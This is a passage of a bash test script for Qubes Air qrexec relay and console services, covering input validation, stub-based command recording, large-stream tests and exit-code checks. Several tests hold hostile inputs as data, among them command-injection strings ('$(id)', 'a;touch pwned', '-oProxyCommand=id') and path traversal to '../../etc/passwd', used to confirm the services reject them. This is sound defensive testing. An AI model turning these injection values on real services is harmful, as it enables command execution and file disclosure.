#!/bin/bash
# test-qrexec-services.sh — hermetic contract tests for the shell qrexec services.
# =====================================================================================
# AGENTS.md §6: every shell/qrexec service is tested for empty input, illegal
# service/path/argument, oversized input/output and non-zero exit. The services
# run next to qrexec, QubesDB, cryptsetup and systemd, none of which exist on a
# developer Mac or a CI runner, so this runner builds a small fake world per case:
#
#   * Tool jail. A service runs under `env -i` with a PATH of (1) the stubs the
#     case installed and (2) symlinks to a short allowlist of harmless utilities.
#     A real cryptsetup, mount, systemd-run or qubesdb-read on the host is never
#     reachable; an unexpected command fails with 127 and the assertions see it.
#   * Recording stubs. Every stub appends "name [arg1] [arg2] ..." to the case's
#     calls.log and can capture its stdin and environment, so a case asserts the
#     exact argv a service built — and that a rejected request ran nothing.
#   * Private copies. Services hard-code a few absolute paths on purpose (an env
#     override would be extra runtime surface): the /usr/local/bin helpers, the
#     data disk under /dev and the /data mount point. Services run from a copy in
#     which exactly those literals point into the active case. A rewrite that
#     matches nothing aborts the run, so a renamed path cannot silently fall back
#     to the real system path.
#   * One active case. Stubs and service copies are written once per run and
#     reach the active case through the $WORK/cur symlink; each case only links
#     the stubs it wants into its own bin/. (macOS checks every freshly written
#     executable on its first run, ~50 ms each; per-case copies made the run slow.)
#
# The inventory case at the end assigns every file in the service directories to
# this suite or to the Go tests that already run the real script; a new service
# file that belongs to neither fails the run.
#
# Usage: scripts/test-qrexec-services.sh [case-name-substring]
#        QREXEC_TEST_TIMEOUT=<seconds> bounds one service run (default 30).
# Exit:  0 every case passed; 1 a case failed; 2 the harness could not set up.
# =====================================================================================
# Hostile inputs are single-quoted literals on purpose ('$(id)', '`id`', ...), and
# the t_* test groups are discovered through `declare -F`, not called by name.
# shellcheck disable=SC2016,SC2317
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd -P)"
FILTER="${1:-}"
CASE_TIMEOUT="${QREXEC_TEST_TIMEOUT:-30}"

die() {
    printf 'test-qrexec-services: %s\n' "$*" >&2
    exit 2
}

WORK="$(mktemp -d "${TMPDIR:-/tmp}/qrexec-tests.XXXXXX")" || die "cannot create a work directory"
WORK="$(cd "$WORK" && pwd -P)" || die "cannot resolve the work directory"
trap 'chmod -R u+rwx "$WORK" 2>/dev/null; rm -rf "$WORK"' EXIT
# Case paths are spliced into service copies as literal text; keep them plain.
case "$WORK" in
    *[!A-Za-z0-9/._-]*) die "work directory '$WORK' has characters the path rewrites cannot carry; set TMPDIR" ;;
esac

# ---- tool jail ----------------------------------------------------------------------
TOOLS="$WORK/tools"
mkdir -p "$TOOLS"
for tool in awk cat cmp cut env find grep head mkdir readlink rm sed sleep tr wc; do
    real="$(command -v "$tool")" || die "missing required tool: $tool"
    ln -s "$real" "$TOOLS/$tool"
done

# ---- shared test data ---------------------------------------------------------------
# Every byte value (NUL, CR, LF, 0xFF ...), doubled up to 1 MiB, then 3 MiB: larger
# than any pipe buffer, so a service that truncates or re-encodes shows up.
make_blobs() {
    local i=0 oct seed=''
    while [ "$i" -lt 256 ]; do
        printf -v oct '%03o' "$i"
        seed="$seed\\$oct"
        i=$((i + 1))
    done
    # shellcheck disable=SC2059 # the format is a string of octal escapes by design
    printf "$seed" >"$WORK/blob"
    i=0
    while [ "$i" -lt 12 ]; do
        cat "$WORK/blob" "$WORK/blob" >"$WORK/blob.next" && mv "$WORK/blob.next" "$WORK/blob"
        i=$((i + 1))
    done
    cat "$WORK/blob" "$WORK/blob" "$WORK/blob" >"$WORK/blob-3m"
}
make_blobs
BLOB="$WORK/blob-3m"

# ---- stubs --------------------------------------------------------------------------
CUR="$WORK/cur"      # symlink to the active case directory
STUBS="$WORK/stubs"  # stub executables, written once, linked into cases
SVCDIR="$WORK/svc"   # rewritten service copies, written once
mkdir -p "$STUBS" "$SVCDIR"

# The prelude every stub shares: log argv, dump the environment, and offer `reply`,
# which replays the scripted stdout/stderr/exit code from $C/ctl/<name>.*.
cat >"$WORK/stub-prelude" <<'PRELUDE'
{ printf '%s' "$NAME"; for a in "$@"; do printf ' [%s]' "$a"; done; printf '\n'; } >>"$C/calls.log"
env >"$C/got/$NAME.env"
reply() {
    if [ -f "$C/ctl/$NAME.capture-stdin" ]; then cat >"$C/got/$NAME.stdin"; fi
    if [ -f "$C/ctl/$NAME.stdout" ]; then cat "$C/ctl/$NAME.stdout"; fi
    if [ -f "$C/ctl/$NAME.stderr" ]; then cat "$C/ctl/$NAME.stderr" >&2; fi
    rc=0
    if [ -f "$C/ctl/$NAME.rc" ]; then rc="$(cat "$C/ctl/$NAME.rc")"; fi
    exit "$rc"
}
PRELUDE

# make_stub KIND NAME: write the stub $STUBS/KIND/NAME; its body is read from
# stdin (empty = `reply`). Stubs act on whichever case $CUR points at.
make_stub() {
    local file="$STUBS/$1/$2" body
    body="$(cat)"
    [ -n "$body" ] || body='reply'
    mkdir -p "$STUBS/$1"
    {
        printf '#!/bin/bash\n'
        printf "C='%s'\n" "$CUR"
        printf "NAME='%s'\n" "$2"
        cat "$WORK/stub-prelude"
        printf '%s\n' "$body"
    } >"$file"
    chmod 755 "$file"
}

# link_stub KIND NAME [DIR]: make a stub visible to the active case, in its PATH
# directory by default.
link_stub() {
    [ -x "$STUBS/$1/$2" ] || make_stub "$1" "$2" </dev/null
    ln -s "$STUBS/$1/$2" "${3:-$C/bin}/$2"
}
# stub NAME: a replaying stub reachable through PATH.
stub() { link_stub reply "$1"; }
# stub_abs NAME: a replaying stub for a helper the service calls by absolute path;
# it is NOT on PATH, so a service that stopped using the absolute path fails.
stub_abs() { link_stub reply "$1" "$C/abs"; }

# ---- cases and assertions -----------------------------------------------------------
CASES=0
FAILED=0
FAILED_NAMES=''
EXERCISED=''   # basenames of the services run_svc actually executed
C=''
CASE_NAME=''
RC=0
SVC=''

# case_begin NAME: fresh case directory; returns 1 when the filter skips the case.
case_begin() {
    CASE_NAME="${1//$'\n'/\\n}"
    if [ -n "$FILTER" ]; then
        case "$CASE_NAME" in *"$FILTER"*) ;; *) return 1 ;; esac
    fi
    CASES=$((CASES + 1))
    C="$WORK/case-$CASES"
    mkdir -p "$C/bin" "$C/abs" "$C/ctl" "$C/got" "$C/home" "$C/cwd"
    rm -f "$CUR"
    ln -s "$C" "$CUR"
    : >"$C/calls.log"
    : >"$C/stdin"
    : >"$C/stdout"
    : >"$C/stderr"
    : >"$C/failures"
    RC=0
    return 0
}

fail() { printf '    %s\n' "$*" >>"$C/failures"; }

show() {
    [ -s "$2" ] || return 0
    printf '    --- %s (first 15 lines)\n' "$1"
    head -n 15 "$2" | cut -c 1-300 | sed 's/^/    | /'
}

case_end() {
    if [ -s "$C/failures" ]; then
        FAILED=$((FAILED + 1))
        FAILED_NAMES="$FAILED_NAMES
  - $CASE_NAME"
        printf 'not ok %d - %s\n' "$CASES" "$CASE_NAME"
        cat "$C/failures"
        show stdout "$C/stdout"
        show stderr "$C/stderr"
        show calls "$C/calls.log"
    else
        printf 'ok %d - %s\n' "$CASES" "$CASE_NAME"
    fi
}

# literal_replace FILE FROM TO: replace every occurrence of a literal string;
# fails when there was none.
literal_replace() {
    local file="$1" from="$2" to="$3" count
    awk -v from="$from" -v to="$to" -v countfile="$file.count" '
        {
            line = $0; out = ""
            while ((i = index(line, from)) > 0) {
                out = out substr(line, 1, i - 1) to
                line = substr(line, i + length(from))
                n++
            }
            print out line
        }
        END { print n + 0 > countfile }' "$file" >"$file.new" || return 1
    mv "$file.new" "$file"
    count="$(cat "$file.count")"
    rm -f "$file.count"
    [ "$count" -gt 0 ]
}

# install_svc REL_PATH [FROM=TO ...]: point $SVC at the run's copy of a service,
# creating it on first use with the path rewrites applied in order. Rewrites
# target $CUR, so one copy serves every case.
install_svc() {
    local rel="$1" spec from to
    shift
    [ -f "$REPO_ROOT/$rel" ] || die "service not found: $rel"
    SVC="$SVCDIR/${rel##*/}"
    [ -x "$SVC" ] && return 0
    cp "$REPO_ROOT/$rel" "$SVC"
    for spec in "$@"; do
        from="${spec%%=*}"
        to="${spec#*=}"
        literal_replace "$SVC" "$from" "$to" ||
            die "$rel no longer contains '$from'; update the rewrite in this test"
    done
    leftover_system_paths "$SVC" ||
        die "$rel still names a system executable path after the rewrites; add a rewrite"
    chmod 755 "$SVC"
}

# leftover_system_paths FILE: fail when a line of code (not the shebang, not a
# comment) could still reach a real system binary: it names an executable
# directory of the host (as a path prefix, a PATH entry or a bare word), resets
# PATH, or asks for the default PATH with `command -p`. The work directory itself
# is ignored, whatever TMPDIR it lives under.
leftover_system_paths() {
    awk -v work="$WORK" '
        NR == 1 || /^[[:space:]]*#/ { next }
        {
            line = $0
            while ((i = index(line, work)) > 0) {
                line = substr(line, 1, i - 1) substr(line, i + length(work))
            }
            if (line ~ /(^|[^A-Za-z0-9_.-])\/(usr\/local\/s?bin|usr\/s?bin|s?bin|opt|etc\/qubes-rpc)([^A-Za-z0-9_.-]|$)/ ||
                line ~ /(^|[^A-Za-z0-9_])PATH[+]?=/ ||
                line ~ /(^|[^A-Za-z0-9_-])command([[:space:]]+-[A-Za-z]+)*[[:space:]]+-[A-Za-z]*p/) {
                print FILENAME ":" NR ": " $0 > "/dev/stderr"
                bad = 1
            }
        }
        END { exit bad }' "$1"
}

# run_svc [VAR=value ...] -- SERVICE [ARG ...]
# Runs SERVICE from an empty directory with only the jail PATH, a private HOME and
# the given variables. stdin is $C/stdin; stdout, stderr and the exit status land
# in $C/stdout, $C/stderr and $RC. A hung service is killed after $CASE_TIMEOUT.
run_svc() {
    local envs=() pid watchdog
    while [ "$#" -gt 0 ] && [ "$1" != "--" ]; do
        envs+=("$1")
        shift
    done
    [ "$#" -gt 1 ] || die "run_svc needs: [VAR=value ...] -- service [arg ...]"
    shift
    EXERCISED="$EXERCISED ${1##*/}"
    (cd "$C/cwd" && exec env -i "PATH=$C/bin:$TOOLS" "HOME=$C/home" ${envs[@]+"${envs[@]}"} "$@") \
        <"$C/stdin" >"$C/stdout" 2>"$C/stderr" &
    pid=$!
    (
        trap 'kill "$sleeper" 2>/dev/null; exit 0' TERM
        sleep "$CASE_TIMEOUT" &
        sleeper=$!
        wait "$sleeper"
        kill -KILL "$pid" 2>/dev/null
    ) >/dev/null 2>&1 &
    watchdog=$!
    wait "$pid"
    RC=$?
    kill -TERM "$watchdog" 2>/dev/null
    wait "$watchdog" 2>/dev/null
    [ "$RC" -ne 137 ] || fail "killed after ${CASE_TIMEOUT}s: the service hung"
}

expect_rc() {
    [ "$RC" -eq "$1" ] || fail "exit status: want $1, got $RC"
}

expect_stdout() {
    local got
    got="$(cat "$C/stdout")"
    [ "$got" = "$1" ] || fail "stdout: want [$1], got [$got]"
}

expect_stdout_empty() {
    [ ! -s "$C/stdout" ] || fail "stdout: want nothing, got [$(head -c 200 "$C/stdout")]"
}

expect_stdout_file() {
    cmp -s "$1" "$C/stdout" || fail "stdout is not byte-identical to $(basename "$1")"
}

expect_stdout_lacks() {
    if grep -qF -- "$1" "$C/stdout"; then fail "stdout must not contain [$1]"; fi
}

expect_stderr_has() {
    grep -qF -- "$1" "$C/stderr" || fail "stderr lacks [$1]"
}

# calls.log with process-substitution fd numbers normalized.
calls() { sed -E 's#/dev/fd/[0-9]+#/dev/fd/N#g' "$C/calls.log"; }

expect_calls() {
    local got
    got="$(calls)"
    [ "$got" = "$1" ] || fail "commands run:
      want: $(printf '%s' "$1" | sed '2,$s/^/            /')
      got:  $(printf '%s' "$got" | sed '2,$s/^/            /')"
}

expect_no_calls() {
    [ ! -s "$C/calls.log" ] || fail "no command may run, but: $(tr '\n' ';' <"$C/calls.log")"
}

expect_not_called() {
    if awk -v n="$1" '$1 == n { found = 1 } END { exit !found }' "$C/calls.log"; then
        fail "$1 must not run, but: $(tr '\n' ';' <"$C/calls.log")"
    fi
}

expect_got_file() { # STUB REFERENCE: the stdin a stub captured equals REFERENCE
    cmp -s "$2" "$C/got/$1.stdin" || fail "$1 did not receive the exact input bytes"
}

expect_got_env() { # STUB VAR=value
    grep -qxF -- "$2" "$C/got/$1.env" 2>/dev/null || fail "$1 ran without $2 in its environment"
}

put() { # FILE CONTENT (no trailing newline added)
    mkdir -p "$(dirname "$1")"
    printf '%s' "$2" >"$1"
}

long_string() { # CHAR COUNT
    local s="$1"
    while [ "${#s}" -lt "$2" ]; do s="$s$s"; done
    printf '%s' "${s:0:$2}"
}

# ---- the harness's own guard --------------------------------------------------------
t_harness_path_scan() {
    local line
    for line in 'exec /usr/local/bin/relay-call' 'x=/usr/bin' 'PATH=/usr/bin:/bin' \
        'export PATH="/usr/sbin:$PATH"' 'PATH+=:/opt/tools' 'env PATH=/x tool' 'command -p cat' \
        'command -v -p id' 'ls /sbin' '"$(/bin/ls)"' 'cp x /etc/qubes-rpc/y'; do
        case_begin "harness: the path scan flags '$line'" || continue
        printf '#!/bin/bash\n# /usr/bin in a comment is fine\n%s\n' "$line" >"$C/sample"
        if leftover_system_paths "$C/sample" 2>/dev/null; then fail "not flagged"; fi
        case_end
    done
    case_begin "harness: the path scan leaves ordinary code alone" || return 0
    printf '%s\n' '#!/bin/bash' 'command -v systemd-run >/dev/null 2>&1' 'echo "$PATH" 2>/dev/null' \
        "exec $WORK/abs/relay-call" 'd=/rw/config/qubesair' 'x=/usr/binary /optional' >"$C/sample"
    leftover_system_paths "$C/sample" 2>"$C/stderr" || fail "false positive: $(cat "$C/stderr")"
    case_end
}

# =====================================================================================
# relay/transport/qubesair.GrpcProxy — RemoteVM transport_rpc on the relay.
# $1 = "<target>+<service>[+<arg>]"; execs relay-call against the agent.
# =====================================================================================
EP='10.0.0.5:8443'

# A QubesDB whose keys are files under $C/qubesdb; a missing key exits 1 like the
# real qubesdb-read.
make_stub qubesdb qubesdb-read <<'EOF'
f="$C/qubesdb$1"
if [ -f "$f" ]; then cat "$f"; exit 0; fi
echo "qubesdb-read: no such key: $1" >&2
exit 1
EOF

grpc_setup() {
    install_svc relay/transport/qubesair.GrpcProxy "/usr/local/bin/=$CUR/abs/"
    put "$C/relay/relay.crt" 'cert'
    put "$C/relay/relay.key" 'key'
    put "$C/relay/ca.crt" 'ca'
    link_stub qubesdb qubesdb-read
    put "$C/qubesdb/remote-endpoint/remote-a" "$EP"
    stub_abs relay-call
    : >"$C/ctl/relay-call.capture-stdin"
}

grpc_run() {
    run_svc "QUBES_AIR_RELAY_DIR=$C/relay" "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=work \
        -- "$SVC" "$@"
}

grpc_relay_call() { # TIMEOUT SERVICE-ARG: the provisioned-mode relay-call line
    printf 'relay-call [-timeout] [%s] [-cert] [%s] [-key] [%s] [-ca] [%s] [-addr] [%s] [remote-a] [%s]' \
        "$1" "$C/relay/relay.crt" "$C/relay/relay.key" "$C/relay/ca.crt" "$EP" "$2"
}

t_grpcproxy_empty_argument() {
    local arg
    for arg in '' '<none>'; do
        case_begin "GrpcProxy: empty argument ($arg) is a usage error" || continue
        grpc_setup
        if [ "$arg" = '<none>' ]; then grpc_run; else grpc_run "$arg"; fi
        expect_rc 1
        expect_stderr_has '用法'
        expect_no_calls
        case_end
    done
}

t_grpcproxy_malformed_argument() {
    local arg
    for arg in 'remote-a' 'remote-a+' '+qubesair.Ping'; do
        case_begin "GrpcProxy: malformed '$arg' is refused before any lookup" || continue
        grpc_setup
        grpc_run "$arg"
        expect_rc 1
        expect_stderr_has '参数格式错误'
        expect_no_calls
        case_end
    done
}

t_grpcproxy_illegal_target() {
    local arg
    for arg in 'work+qubesair.Ping' 'dom0+qubesair.Ping' 'remote-+qubesair.Ping' \
        'remote-a;id+qubesair.Ping' 'remote-a b+qubesair.Ping' 'remote-../../etc+qubesair.Ping' \
        'remote-a/b+qubesair.Ping' 'remote-$(id)+qubesair.Ping' $'remote-a\nremote-b+qubesair.Ping'; do
        case_begin "GrpcProxy: illegal target in '$arg' is refused" || continue
        grpc_setup
        grpc_run "$arg"
        expect_rc 126
        expect_stderr_has '不是 remote-* 名'
        expect_no_calls
        case_end
    done
}

t_grpcproxy_illegal_service() {
    local arg
    for arg in 'remote-a+../../bin/sh' 'remote-a+qubesair.Ping;id' 'remote-a+qubesair Ping' \
        'remote-a+-oProxyCommand=id' 'remote-a+$(id)' 'remote-a+`id`' 'remote-a+1qubesair.Ping' \
        $'remote-a+qubesair.Ping\nid'; do
        case_begin "GrpcProxy: illegal service in '$arg' is refused" || continue
        grpc_setup
        grpc_run "$arg"
        expect_rc 126
        expect_stderr_has '非法服务名'
        expect_no_calls
        case_end
    done
}

# The argument after the service name gets the agent's own rule
# (validServiceName in internal/agent/invoker.go): same charset, no "..", and at
# most 128 bytes for service+argument. dom0's qrexec already restricts argument
# characters, so this is the relay's defence in depth, like the target check.
t_grpcproxy_illegal_service_argument() {
    local arg
    for arg in 'remote-a+qubes.StartApp+a b' 'remote-a+qubes.StartApp+a;id' \
        'remote-a+qubes.StartApp+../../etc/passwd' 'remote-a+qubes.StartApp+..' \
        'remote-a+qubes.StartApp+a/b' 'remote-a+qubes.StartApp+$(id)' 'remote-a+qubes.StartApp+`id`' \
        $'remote-a+qubes.StartApp+a\nb' "remote-a+qubes.StartApp+$(long_string a 114)"; do
        case_begin "GrpcProxy: illegal service argument in '${arg:0:60}' is refused" || continue
        grpc_setup
        grpc_run "$arg"
        expect_rc 126
        expect_stderr_has '非法服务参数'
        expect_no_calls
        case_end
    done
}

t_grpcproxy_argument_length_boundary() {
    local arg
    arg="qubes.StartApp+$(long_string a 113)"
    case_begin "GrpcProxy: a 128-byte service+argument is forwarded" || return 0
    grpc_setup
    grpc_run "remote-a+$arg"
    expect_rc 0
    expect_calls "qubesdb-read [/remote-endpoint/remote-a]
$(grpc_relay_call 180s "$arg")"
    case_end
}

t_grpcproxy_long_target() {
    case_begin "GrpcProxy: a very long target has no endpoint and never dials" || return 0
    grpc_setup
    grpc_run "remote-$(long_string a 4096)+qubesair.Ping"
    expect_rc 1
    expect_stderr_has '未设置'
    expect_not_called relay-call
    case_end
}

t_grpcproxy_provisioned_call() {
    case_begin "GrpcProxy: provisioned relay dials the QubesDB endpoint with its own cert" || return 0
    grpc_setup
    put "$C/ctl/relay-call.stdout" 'pong remote-a 1700000000'
    put "$C/stdin" 'request body'
    grpc_run 'remote-a+qubesair.Ping+'
    expect_rc 0
    expect_stdout 'pong remote-a 1700000000'
    expect_calls "qubesdb-read [/remote-endpoint/remote-a]
$(grpc_relay_call 20s qubesair.Ping)"
    expect_got_file relay-call "$C/stdin"
    expect_stderr_has 'source=work target=remote-a service=qubesair.Ping'
    case_end
}

t_grpcproxy_service_argument_and_timeouts() {
    local spec arg want tmo
    for spec in 'remote-a+qubes.StartApp+org.gnome.Calculator|qubes.StartApp+org.gnome.Calculator|180s' \
        'remote-a+qubesair.Exec|qubesair.Exec|180s' \
        'remote-a+qubesair.Status+|qubesair.Status|20s'; do
        arg="${spec%%|*}"
        tmo="${spec##*|}"
        want="${spec#*|}"
        want="${want%|*}"
        case_begin "GrpcProxy: '$arg' forwards '$want' with a $tmo deadline" || continue
        grpc_setup
        grpc_run "$arg"
        expect_rc 0
        expect_calls "qubesdb-read [/remote-endpoint/remote-a]
$(grpc_relay_call "$tmo" "$want")"
        case_end
    done
}

t_grpcproxy_missing_endpoint() {
    case_begin "GrpcProxy: a target without a QubesDB endpoint never dials" || return 0
    grpc_setup
    rm -f "$C/qubesdb/remote-endpoint/remote-a"
    grpc_run 'remote-a+qubesair.Ping'
    expect_rc 1
    expect_stderr_has '未设置'
    expect_not_called relay-call
    case_end
}

t_grpcproxy_illegal_endpoint() {
    local ep
    for ep in '10.0.0.5:8443;touch pwned' 'evil.example:8443' '-oProxyCommand=id' '10.0.0.5' \
        '10.0.0.5:8443 10.0.0.6:8443' $'10.0.0.5:8443\n-x' '10.0.0.5:844300'; do
        case_begin "GrpcProxy: QubesDB endpoint '$ep' is refused" || continue
        grpc_setup
        put "$C/qubesdb/remote-endpoint/remote-a" "$ep"
        grpc_run 'remote-a+qubesair.Ping'
        expect_rc 126
        expect_stderr_has '不是合法 ip:port'
        expect_not_called relay-call
        case_end
    done
}

t_grpcproxy_exit_status_propagates() {
    local rc
    for rc in 1 3 126; do
        case_begin "GrpcProxy: relay-call exit $rc reaches the caller" || continue
        grpc_setup
        put "$C/ctl/relay-call.rc" "$rc"
        put "$C/ctl/relay-call.stderr" 'remote said no'
        put "$C/ctl/relay-call.stdout" 'partial'
        grpc_run 'remote-a+qubesair.Exec'
        expect_rc "$rc"
        expect_stdout 'partial'
        expect_stderr_has 'remote said no'
        case_end
    done
}

t_grpcproxy_oversized_streams() {
    case_begin "GrpcProxy: 3 MiB request and reply pass through byte-exact" || return 0
    grpc_setup
    cp "$BLOB" "$C/stdin"
    cp "$BLOB" "$C/ctl/relay-call.stdout"
    grpc_run 'remote-a+qubesair.FileCopy'
    expect_rc 0
    expect_got_file relay-call "$BLOB"
    expect_stdout_file "$BLOB"
    case_end
}

t_grpcproxy_mint_mode() {
    case_begin "GrpcProxy: console-as-relay loads secrets.env and resolves from the database" || return 0
    grpc_setup
    rm -rf "$C/relay"
    put "$C/console/secrets.env" 'QUBES_AIR_ENCRYPTION_KEY=unit-test-key'
    grpc_run 'remote-a+qubesair.Ping+'
    expect_rc 0
    expect_calls "relay-call [-timeout] [20s] [-db] [$C/console/qubes-air.db] [remote-a] [qubesair.Ping]"
    expect_got_env relay-call 'QUBES_AIR_ENCRYPTION_KEY=unit-test-key'
    case_end
}

t_grpcproxy_undeployed() {
    case_begin "GrpcProxy: half-provisioned relay without secrets.env refuses to run" || return 0
    grpc_setup
    rm -f "$C/relay/relay.key"
    grpc_run 'remote-a+qubesair.Ping'
    expect_rc 1
    expect_stderr_has '未正确部署'
    expect_no_calls
    case_end
}

# =====================================================================================
# relay/transport/qubesair.ConnectTCP — raw GUI tunnel to a remote loopback port.
# $1 = "<remote>+<port>"; execs relay-call -stream.
# =====================================================================================
tcp_setup() {
    install_svc relay/transport/qubesair.ConnectTCP "/usr/local/bin/=$CUR/abs/"
    put "$C/relay/relay.crt" 'cert'
    link_stub qubesdb qubesdb-read
    put "$C/qubesdb/remote-endpoint/remote-a" "$EP"
    stub_abs relay-call
    : >"$C/ctl/relay-call.capture-stdin"
}

tcp_run() {
    run_svc "QUBES_AIR_RELAY_DIR=$C/relay" QREXEC_REMOTE_DOMAIN=work -- "$SVC" "$@"
}

tcp_relay_call() { # PORT
    printf 'relay-call [-stream] [-timeout] [12h] [-cert] [%s] [-key] [%s] [-ca] [%s] [-addr] [%s] [remote-a] [%s]' \
        "$C/relay/relay.crt" "$C/relay/relay.key" "$C/relay/ca.crt" "$EP" "$1"
}

t_connecttcp_usage_errors() {
    local arg
    for arg in '' '<none>' 'remote-a' 'remote-a+' '+5901'; do
        case_begin "ConnectTCP: '$arg' is a usage error" || continue
        tcp_setup
        if [ "$arg" = '<none>' ]; then tcp_run; else tcp_run "$arg"; fi
        expect_rc 1
        expect_stderr_has '用法'
        expect_no_calls
        case_end
    done
}

t_connecttcp_illegal_target() {
    local arg
    for arg in 'work+5901' 'remote-a;id+5901' 'remote-../x+5901' 'remote-a b+5901' \
        'remote-$(id)+5901' $'remote-a\n+5901'; do
        case_begin "ConnectTCP: illegal target in '$arg' is refused" || continue
        tcp_setup
        tcp_run "$arg"
        expect_rc 126
        expect_stderr_has '不是 remote-* 名'
        expect_no_calls
        case_end
    done
}

t_connecttcp_illegal_port() {
    local arg
    for arg in 'remote-a+59o1' 'remote-a+5901;id' 'remote-a+-1' 'remote-a+ 5901' \
        'remote-a+5901+x' 'remote-a+123456' $'remote-a+5901\n' 'remote-a+../5901'; do
        case_begin "ConnectTCP: malformed port in '$arg' is refused" || continue
        tcp_setup
        tcp_run "$arg"
        expect_rc 126
        expect_stderr_has '非法端口'
        expect_no_calls
        case_end
    done
}

t_connecttcp_port_outside_gui_range() {
    local port
    for port in 0 22 5899 5911 9999 10011 65535 99999; do
        case_begin "ConnectTCP: port $port is outside the GUI allowlist" || continue
        tcp_setup
        tcp_run "remote-a+$port"
        expect_rc 126
        expect_stderr_has '不在允许的 GUI 段'
        expect_no_calls
        case_end
    done
}

t_connecttcp_range_boundaries() {
    local port
    for port in 5900 5910 10000 10010; do
        case_begin "ConnectTCP: boundary port $port is tunnelled" || continue
        tcp_setup
        tcp_run "remote-a+$port"
        expect_rc 0
        expect_calls "qubesdb-read [/remote-endpoint/remote-a]
$(tcp_relay_call "$port")"
        case_end
    done
}

t_connecttcp_missing_endpoint() {
    case_begin "ConnectTCP: a missing endpoint never dials" || return 0
    tcp_setup
    rm -f "$C/qubesdb/remote-endpoint/remote-a"
    tcp_run 'remote-a+5901'
    expect_rc 1
    expect_stderr_has '端点表里没有'
    expect_not_called relay-call
    case_end
}

t_connecttcp_illegal_endpoint() {
    case_begin "ConnectTCP: an illegal QubesDB endpoint never dials" || return 0
    tcp_setup
    put "$C/qubesdb/remote-endpoint/remote-a" '10.0.0.5:8443;id'
    tcp_run 'remote-a+5901'
    expect_rc 1
    expect_not_called relay-call
    case_end
}

t_connecttcp_unbootstrapped() {
    case_begin "ConnectTCP: an unbootstrapped relay never dials" || return 0
    tcp_setup
    rm -f "$C/relay/relay.crt"
    tcp_run 'remote-a+5901'
    expect_rc 1
    expect_stderr_has 'bootstrap'
    expect_not_called relay-call
    case_end
}

t_connecttcp_stream() {
    case_begin "ConnectTCP: 3 MiB each way streams byte-exact over relay-call -stream" || return 0
    tcp_setup
    cp "$BLOB" "$C/stdin"
    cp "$BLOB" "$C/ctl/relay-call.stdout"
    tcp_run 'remote-a+5901'
    expect_rc 0
    expect_calls "qubesdb-read [/remote-endpoint/remote-a]
$(tcp_relay_call 5901)"
    expect_got_file relay-call "$BLOB"
    expect_stdout_file "$BLOB"
    case_end
}

t_connecttcp_exit_status_propagates() {
    case_begin "ConnectTCP: relay-call exit 1 reaches the caller" || return 0
    tcp_setup
    put "$C/ctl/relay-call.rc" 1
    put "$C/ctl/relay-call.stderr" 'stream failed: connection refused'
    tcp_run 'remote-a+5901'
    expect_rc 1
    expect_stderr_has 'connection refused'
    case_end
}

# =====================================================================================
# console/qrexec/qubesair.IssueRelayCert — console CA signs a relay's CSR.
# Caller identity comes only from QREXEC_REMOTE_DOMAIN; CSR on stdin.
# =====================================================================================
cert_setup() {
    install_svc console/qrexec/qubesair.IssueRelayCert "/usr/local/bin/=$CUR/abs/"
    put "$C/console/secrets.env" 'QUBES_AIR_ENCRYPTION_KEY=unit-test-key'
    stub_abs issue-relay-cert
    : >"$C/ctl/issue-relay-cert.capture-stdin"
}

cert_calls() { # CALLER
    printf 'issue-relay-cert [-db] [%s] [%s]' "$C/console/qubes-air.db" "$1"
}

t_issuerelaycert_requires_caller() {
    local how
    for how in empty unset; do
        case_begin "IssueRelayCert: $how QREXEC_REMOTE_DOMAIN is refused" || continue
        cert_setup
        if [ "$how" = empty ]; then
            run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN= -- "$SVC"
        else
            run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC"
        fi
        expect_rc 1
        expect_stderr_has 'QREXEC_REMOTE_DOMAIN 为空'
        expect_no_calls
        case_end
    done
}

t_issuerelaycert_requires_console() {
    case_begin "IssueRelayCert: a qube without secrets.env refuses to sign" || return 0
    cert_setup
    rm -f "$C/console/secrets.env"
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 1
    expect_stderr_has 'secrets.env'
    expect_no_calls
    case_end
}

t_issuerelaycert_signs_for_caller() {
    case_begin "IssueRelayCert: signs the CSR for the dom0-named caller" || return 0
    cert_setup
    put "$C/stdin" $'-----BEGIN CERTIFICATE REQUEST-----\nMIIB\n-----END CERTIFICATE REQUEST-----\n'
    put "$C/ctl/issue-relay-cert.stdout" '{"cert_pem":"x","ca_pem":"y"}'
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 0
    expect_stdout '{"cert_pem":"x","ca_pem":"y"}'
    expect_calls "$(cert_calls sys-relay)"
    expect_got_file issue-relay-cert "$C/stdin"
    expect_got_env issue-relay-cert 'QUBES_AIR_ENCRYPTION_KEY=unit-test-key'
    case_end
}

t_issuerelaycert_argument_cannot_pick_identity() {
    case_begin "IssueRelayCert: a service argument cannot choose another identity" || return 0
    cert_setup
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC" relay-other
    expect_rc 0
    expect_calls "$(cert_calls sys-relay)"
    case_end
}

# The wrapper passes the caller as ONE argv element and never interprets it; the
# allowlist is issue-relay-cert's qubeNameRe (TestIssueRelayCert_RejectsBadCaller).
t_issuerelaycert_hostile_caller_is_one_argument() {
    local caller
    for caller in 'a;touch pwned' 'a b' '$(touch pwned)' '../x' '-db' $'a\nb'; do
        case_begin "IssueRelayCert: caller '$caller' reaches the signer verbatim as one argument" || continue
        cert_setup
        run_svc "QUBES_AIR_DATA_DIR=$C/console" "QREXEC_REMOTE_DOMAIN=$caller" -- "$SVC"
        expect_rc 0
        expect_calls "$(cert_calls "$caller")"
        [ ! -e "$C/cwd/pwned" ] || fail "the caller name was executed"
        case_end
    done
}

t_issuerelaycert_exit_status_propagates() {
    case_begin "IssueRelayCert: a refusal from the signer reaches the caller" || return 0
    cert_setup
    put "$C/ctl/issue-relay-cert.rc" 1
    put "$C/ctl/issue-relay-cert.stderr" 'issue-relay-cert: refused: CSR common name mismatch'
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 1
    expect_stdout_empty
